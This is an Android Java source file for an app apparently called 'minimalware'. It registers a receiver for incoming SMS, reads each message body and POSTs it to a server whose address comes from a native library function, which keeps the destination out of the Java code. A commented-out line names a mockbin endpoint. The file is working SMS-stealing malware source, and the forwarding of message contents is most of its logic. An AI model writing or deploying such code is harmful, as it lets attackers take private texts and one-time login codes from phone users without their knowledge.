package com.example.minimalware;

import androidx.appcompat.app.AppCompatActivity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import com.example.minimalware.databinding.ActivityMainBinding;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    // Used to load the 'minimalware' library on application startup.
    static {
        System.loadLibrary("minimalware");
    }

    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Example of a call to a native method
        TextView tv = binding.sampleText;
        tv.setText(stringFromJNI());

        // Register BroadcastReceiver (if dynamic registration is needed)
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        registerReceiver(new SMSBroadcast(), filter);
    }

    public void updateUI(String data) {
        // Update UI with the data
        Toast.makeText(this, data, Toast.LENGTH_SHORT).show();
    }

    public class SMSBroadcast extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
            String message = "";

            for (SmsMessage sms : messages)
            {
                message = sms.getMessageBody();
                updateUI(message);
            }

            // Create Retrofit instance and ApiService
            //ApiService apiService = RetrofitClient.getClient("https://bcf305308b5c4b4d91d50ae3e365a7a3.api.mockbin.io/").create(ApiService.class);
            ApiService apiService = RetrofitClient.getClient(getURL()).create(ApiService.class);

            // Create a message body
            MessageBody messageBody = new MessageBody(message);

            // Send the message via POST request
            Call<Void> call = apiService.sendMessage(messageBody);
            call.enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    if (response.isSuccessful()) {
                        Toast.makeText(context, "Message sent successfully", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(context, "Failed to send message", Toast.LENGTH_SHORT).show();
                    }
                }

                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    Toast.makeText(context, "Error: " + t.getMessage(), Toast.LENGTH_SHORT).show();
                    Log.d("ERROR", t.getMessage());
                }
            });

        }
    }

    /**
     * A native method that is implemented by the 'minimalware' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();
    public native String getURL();
}